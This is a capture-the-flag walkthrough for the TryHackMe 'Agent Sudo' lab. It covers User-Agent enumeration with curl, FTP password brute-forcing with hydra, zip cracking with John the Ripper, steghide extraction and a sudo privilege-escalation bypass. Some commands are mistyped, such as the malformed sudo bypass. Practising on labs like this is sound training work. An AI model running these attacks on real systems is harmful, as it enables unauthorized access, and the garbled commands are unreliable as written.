---
layout: page
title: Agent Sudo WalkThrough
permalink: /agentSudo
tags: TryHackMe

---
# Agent Sudo 
# ![front](/images/agentsudo/front.png)
[https://tryhackme.com/room/agentsudoctf](https://tryhackme.com/room/agentsudoctf)

## Open Ports:
  - 21: ftp
  - 22: ssh
  - 80: HTTP
  
## Port 80:
1. **Index Page**
![1](/images/agentsudo/1.png)
  - we can brute force different Agents
  ```
    >Curl "http://ip" -H "User-Agent: A" -L
    >Curl "http://ip" -H "User-Agent: B" -L
    >Curl "http://ip" -H "User-Agent: C" -L
  ```
![2](/images/agentsudo/2.png)

## Port 21:
1. Brute force ftp using **Hydra**  to find the _password_
  ```
  hydra -l cxxxx -P /rockyou.txt ftp://ip
  ```
![3](/images/agentsudo/3.png)
2. After logging we will find 3 files _(1 txt, 2 imgs)_
  - binwalk the image we find a zip file inside the image
  - As the zip file is password protected we can use **johnTheRipper** to crack it.
    ```
    John2zip 8072.zip > hash.txt
    John hash.txt --wordlist=/rockyou.tx
    ```
![4](/images/agentsudo/4.png)
 3. Now we find a text file for Agent R
  - It has the passwd in base64
    ```
    echo " " |base64-d (Area51)
    ```
 4. Extracting cute-alien.jpeg file using the password found in **To_AgentR.txt**
    ```
    steghide extract -sf cute-alien.jpeg
    ```
![5](/images/agentsudo/5.png)

   
## Gaining Access:
 **We Found username and password in _message.txt_**
 1. Logging in via ssh
 
### USER Flag:
![user](/images/agentsudo/user.png)
2.Download the image 
  - scp james@ip:/home/james/image.jpeg .
  - Now search in the web (_use google image search_)
 


## Privilege Escalation:
 1. sudo -l
   - [All,!root] /bin/bash
   **To bypass this**
    ```
    sudo #u-1 /bin/bash
    ```
### Root Flag:
![root](/images/agentsudo/root.png)
